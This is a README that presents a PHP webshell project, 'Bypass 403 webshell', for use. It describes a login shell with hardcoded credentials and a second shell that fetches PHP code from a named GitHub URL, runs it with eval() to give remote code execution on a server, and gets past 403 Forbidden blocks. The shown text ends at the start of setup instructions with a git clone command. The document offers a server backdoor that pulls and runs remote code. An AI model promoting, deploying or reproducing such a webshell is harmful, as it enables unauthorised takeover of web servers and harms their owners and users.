# Bypass 403 webshell

This project consists of a two-step webshell system. The first shell handles the login process, where the username `admin` and password `213377` are used. Once authenticated, the second shell fetches and executes PHP code from a specific URL, allowing remote code execution on the server.

## 🚀 Key Features
1. **Login Authentication** 🔑:
   - **Username**: `admin`
   - **Password**: `213377`
   - The first shell handles the login validation via session management.

2. **Bypass 403 Error** 🚫:
   - After logging in successfully, the second shell is activated, bypassing any 403 Forbidden errors that might block access to certain files.

3. **Fetch & Execute PHP Code** 💻:
   - The second shell fetches PHP code from the following URL:  
     `https://github.com/FreedomSecurity1337/403web`.
   - The PHP code fetched is executed using `eval()`, running the script on the server.

4. **Error Handling** ⚠️:
   - Displays error messages if the login fails or if the PHP content from the URL can’t be retrieved.

## 🔧 Setup Instructions
1. **Clone the Repository**:
   ```bash
   git clone https://github.com/FreedomSecurity1337/403web
